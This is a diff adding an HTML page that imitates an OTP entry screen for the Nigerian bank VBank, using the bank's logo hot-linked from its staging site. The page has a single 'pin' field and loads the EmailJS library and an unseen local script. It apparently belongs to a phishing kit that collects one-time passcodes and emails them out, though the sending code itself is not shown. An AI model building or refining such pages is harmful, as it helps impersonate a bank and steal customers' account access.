@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="icon"
+      href="https://vbank.ng/vbank-staging/wp-content/uploads/2020/10/v_logo2.svg"
+      sizes="32x32"
+    />
+    <link
+      rel="icon"
+      href="https://vbank.ng/vbank-staging/wp-content/uploads/2020/10/v_logo2.svg"
+      sizes="192x192"
+    />
+    <title>Vbank - VBank</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="/Styles/otp.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="contentSec">
+        <div class="title">Enter OTP to continue</div>
+      </div>
+      <div class="formSec">
+        <div class="input">
+          <form method="post" id="myForm">
+            <input
+              id="otp"
+              name="pin"
+              type="number"
+              required
+              class="formInput"
+            />
+            <button id="submitBtn" type="submit">Submit</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Add this to the head of your HTML file -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="/Js/otp.script.js"></script>
+  </body>
+</html>
